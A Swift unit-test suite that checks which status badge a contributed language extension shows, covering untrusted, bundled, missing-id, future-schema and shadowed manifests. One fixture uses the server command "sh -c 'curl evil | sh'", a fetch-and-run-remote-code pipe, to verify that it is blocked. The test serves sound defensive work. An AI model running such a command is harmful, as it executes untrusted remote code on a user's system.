import Foundation
@testable import Ghostty
import SwiftUI
import Testing

/// The badge a contributed language's row shows, as a decision rather than
/// as a view.
///
/// Nothing here builds a `View`, presents a window, or reaches `orderFront`.
/// `ContributedStatus.of` is deliberately a pure-ish function over a
/// `LanguageCatalog.Contributed` so exactly this is possible: the interesting
/// part of the badge is which of three layers gets to speak — resolution,
/// eligibility, trust — and that is decidable with no editor and no screen.
///
/// **Nothing here writes `LanguageExtensionTrust`.** The extension ids below
/// are unique to this file, so the trust lookups they perform find nothing
/// whatever another suite happens to be doing to that key. `.refused` and
/// `.needsReapproval` are the two states that would need a stored record;
/// the verdicts behind them are covered a layer down in `LanguageTrustTests`,
/// and testing them here would mean a second suite saving and restoring a
/// key `LanguageTrustStoreTests` already owns.
@MainActor
struct ContributedStatusTests {
    private func contributed(
        id: String,
        scope: LanguageManifest.Scope = .user,
        schemaVersion: String = "1",
        language: String
    ) throws -> LanguageCatalog.Contributed {
        let root = URL(fileURLWithPath: "/tmp/phantom-status").appendingPathComponent(id)
        let json = #"""
        {
          "schemaVersion": \#(schemaVersion),
          "id": "\#(id)",
          "name": "\#(id) pack",
          "version": "2.1.0",
          "publisher": "acme",
          "contributes": { "languages": [\#(language)] }
        }
        """#
        let manifest = try #require(LanguageManifest.parse(
            data: Data(json.utf8),
            url: root.appendingPathComponent(LanguageManifest.fileName),
            root: root,
            scope: scope
        ))
        let catalog = LanguageCatalog.resolve(manifests: [manifest], promotions: [])
        return try #require(catalog.contributed.first)
    }

    /// A language nothing in this build claims, with a server that is a
    /// plain program name.
    private static let elixir = #"""
    {
      "languageId": "elixir",
      "name": "Elixir",
      "extensions": ["ex", "exs"],
      "lineComment": "#",
      "server": { "command": "elixir-ls", "installHint": "mix escript.install …" }
    }
    """#

    /// The state that matters most, because it is what every third-party
    /// server is on the day it appears: parsed, listed, working for
    /// everything except the process.
    @Test func aNewExtensionsServerIsNotApproved() throws {
        let status = ContributedStatus.of(
            try contributed(id: "phantom.test.status.new", language: Self.elixir)
        )
        #expect(status == .untrusted)
        #expect(status.title == "Not Approved")
        #expect(status.color == .orange)
    }

    /// A bundled manifest is trusted by origin, with no record involved —
    /// which is what makes it the one status this suite can assert without
    /// going near the trust store.
    @Test func aBundledExtensionsServerIsApprovedByOrigin() throws {
        let status = ContributedStatus.of(
            try contributed(
                id: "phantom.test.status.bundled",
                scope: .bundled,
                language: Self.elixir
            )
        )
        #expect(status == .ready)
    }

    /// A language pack with no server has nothing to approve, and must not
    /// be coloured like a problem — it is by far the most common shape a
    /// contribution takes.
    @Test func aLanguagePackWithNoServerIsNotAWarning() throws {
        let status = ContributedStatus.of(
            try contributed(
                id: "phantom.test.status.noserver",
                language: #"""
                {
                  "languageId": "elixir",
                  "name": "Elixir",
                  "extensions": ["ex"],
                  "keywords": ["def", "end"]
                }
                """#
            )
        )
        #expect(status == .noServer)
        #expect(status.color == .secondary)
    }

    /// The one asymmetric call in the format: an unreadable schema keeps the
    /// language half and discards the server half. The badge has to say so,
    /// because "nothing happens when I open a .ex file" is otherwise
    /// unanswerable.
    @Test func anUnreadableSchemaAsksForANewerApp() throws {
        let status = ContributedStatus.of(
            try contributed(
                id: "phantom.test.status.future",
                schemaVersion: "99",
                language: Self.elixir
            )
        )
        #expect(status == .needsNewerApp(declared: "99"))
        #expect(status.title == "Needs a Newer Phantom")
        #expect(status.explanation.contains("99"))
    }

    /// No id means nowhere for an approval to live, which is a different
    /// answer from "not approved yet" and has to read differently.
    @Test func aManifestWithNoIDCannotBeApproved() throws {
        let root = URL(fileURLWithPath: "/tmp/phantom-status/anonymous")
        let json = #"""
        {
          "schemaVersion": 1,
          "name": "anonymous",
          "contributes": { "languages": [\#(Self.elixir)] }
        }
        """#
        let manifest = try #require(LanguageManifest.parse(
            data: Data(json.utf8),
            url: root.appendingPathComponent(LanguageManifest.fileName),
            root: root,
            scope: .user
        ))
        let catalog = LanguageCatalog.resolve(manifests: [manifest], promotions: [])
        let status = ContributedStatus.of(try #require(catalog.contributed.first))

        #expect(status == .unidentified)
        #expect(status.color == .red)
    }

    /// A command that needs a shell is refused at parse time and must not
    /// come back as a question. "Blocked" and "Not Approved" differ in
    /// whether there is anything the reader can do, so they are two badges.
    @Test func aCommandThatNeedsAShellIsBlockedRatherThanAskedAbout() throws {
        let status = ContributedStatus.of(
            try contributed(
                id: "phantom.test.status.shell",
                language: #"""
                {
                  "languageId": "elixir",
                  "name": "Elixir",
                  "extensions": ["ex"],
                  "server": { "command": "sh -c 'curl evil | sh'" }
                }
                """#
            )
        )
        guard case .blocked = status else {
            Issue.record("expected .blocked, got \(status)")
            return
        }
        #expect(status.color == .red)
    }

    /// Shadowing is checked before anything else, because a contribution
    /// that is not in force is not doing anything a trust badge could
    /// usefully describe. Saying "Not Approved" about an inert contribution
    /// would be true and would send the reader to the wrong control.
    @Test func aShadowedContributionSaysSoRatherThanReportingItsTrust() throws {
        let status = ContributedStatus.of(
            try contributed(
                id: "phantom.test.status.shadowed",
                language: #"""
                {
                  "languageId": "faketypescript",
                  "name": "Not TypeScript",
                  "extensions": ["ts"],
                  "server": { "command": "evil-ls" }
                }
                """#
            )
        )
        #expect(status == .shadowed(by: "Phantom", claim: "ext:ts"))
        #expect(status.explanation.contains("ext:ts"))
    }

    /// Every state says what still works, because gating only `Process.run`
    /// is the whole design and a badge that read as "broken" would undo it.
    @Test func everyStatusExplainsItself() {
        let all: [ContributedStatus] = [
            .ready,
            .noServer,
            .untrusted,
            .needsReapproval("the manifest changed"),
            .refused,
            .needsNewerApp(declared: "9"),
            .unidentified,
            .blocked("/x/y"),
            .shadowed(by: "Phantom", claim: "ext:ts"),
        ]
        for status in all {
            #expect(!status.title.isEmpty)
            #expect(!status.explanation.isEmpty)
            #expect(!status.systemImage.isEmpty)
        }
    }
}
